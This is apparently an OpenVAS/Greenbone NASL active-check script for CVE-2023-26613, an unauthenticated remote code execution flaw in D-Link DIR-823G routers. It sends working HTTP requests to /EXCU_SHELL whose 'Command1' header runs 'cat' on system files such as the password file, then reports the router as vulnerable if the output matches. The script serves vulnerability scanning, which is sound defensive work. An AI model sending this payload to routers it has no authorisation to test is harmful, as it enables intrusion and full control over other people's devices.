# SPDX-FileCopyrightText: 2023 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.104824");
  script_version("2023-07-07T05:05:26+0000");
  script_tag(name:"last_modification", value:"2023-07-07 05:05:26 +0000 (Fri, 07 Jul 2023)");
  script_tag(name:"creation_date", value:"2023-07-06 15:03:24 +0000 (Thu, 06 Jul 2023)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2023-26613");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("D-Link DIR-823G 'EXCU_SHELL' RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2023 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl", "os_detection.nasl");
  # nb: No more specific mandatory keys because there might be different vendors affected as well...
  script_mandatory_keys("Host/runs_unixoide");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://github.com/726232111/VulIoT/tree/main/D-Link/DIR823G%20V1.0.2B05/excu_shell");

  script_tag(name:"summary", value:"D-Link DIR-823G Routers are prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability exists within /EXCU_SHELL, which processes
  HTTP requests and performs any commands given to it on the target system with admin privileges.");

  script_tag(name:"impact", value:"Successful exploitation would give an attacker complete control
  over the target system.");

  script_tag(name:"affected", value:"D-Link DIR-823G Routers with firmware version 1.0.2B05 are
  known to be affected. Other devices and vendors might be affected as well.");

  script_tag(name:"solution", value:"No known solution is available as of 06th July, 2023.
  Information regarding this issue will be updated once solution details are available.");

  exit(0);
}

# nb: This flaw is quite similar to 2018/dlink/gb_dlink_dwr_rce_vuln.nasl but has different
# commands in the passed headers.

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

url = "/EXCU_SHELL";

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  cmd = "cat /" + file;

  add_headers = make_array( "Command1", cmd, "Confirm1", "apply" );
  req = http_get_req( port:port, url:url, add_headers:add_headers );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  if( egrep( pattern:pattern, string:res, icase:FALSE ) ) {

    info["HTTP Method"] = "GET";
    info["Affected URL"] = http_report_vuln_url( port:port, url:url, url_only:TRUE );
    foreach header( keys( add_headers ) )
      info['HTTP "' + header + '" Header'] = add_headers[header];

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table( array:info ) + '\n\n';
    report += "it was possible to execute the command '" + cmd + "' on the target.";
    report += '\n\nResult (truncated):\n\n' + substr( res, 0, 1500 );
    expert_info  = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res + '\n\n';
    security_message( port:port, data:chomp( report ), expert_info:expert_info );

    exit( 0 );
  }
}

exit( 99 );
